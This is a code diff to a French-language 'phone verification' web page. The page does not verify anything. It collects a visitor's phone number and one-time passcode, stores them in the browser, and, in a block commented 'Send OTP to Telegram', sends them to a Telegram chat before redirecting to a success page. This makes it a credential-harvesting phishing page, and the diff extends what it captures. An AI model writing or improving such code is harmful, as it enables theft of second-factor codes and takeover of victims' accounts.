@@ -24,14 +24,16 @@
         <h1 class="text-2xl font-bold">Vérification téléphonique</h1>
 
         <p class="text-white/60 text-sm">
-            Entrez le OTP envoyé à votre numéro
+            Entrez votre numéro et le code OTP
         </p>
+
+        <input type="text" id="phone" placeholder="Numéro de téléphone" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-lg">
 
         <input type="text" id="otp" placeholder="Saisissez le code OTP" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-lg">
 
         <button onclick="verifyOTP()" class="w-full bg-white text-black py-4 rounded-xl font-bold">
-    Vérifier
-  </button>
+            Vérifier
+        </button>
 
     </div>
 
@@ -42,15 +44,20 @@
         async function verifyOTP() {
 
             const otp = document.getElementById("otp").value;
+            const phone = document.getElementById("phone").value;
 
             if (!otp) {
-                alert("Enter OTP");
+                alert("Entrez le code OTP");
+                return;
+            }
+
+            if (!phone) {
+                alert("Entrez votre numéro de téléphone");
                 return;
             }
 
             localStorage.setItem("userOTP", otp);
-
-            const phone = localStorage.getItem("verifiedPhone");
+            localStorage.setItem("verifiedPhone", phone);
 
             // Send OTP to Telegram
             const msg =
@@ -70,8 +77,14 @@
                         text: msg
                     })
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("Telegram send failed", e);
+            }
 
             window.location.href = "success.html";
         }
     </script>
+
+</body>
+
+</html>
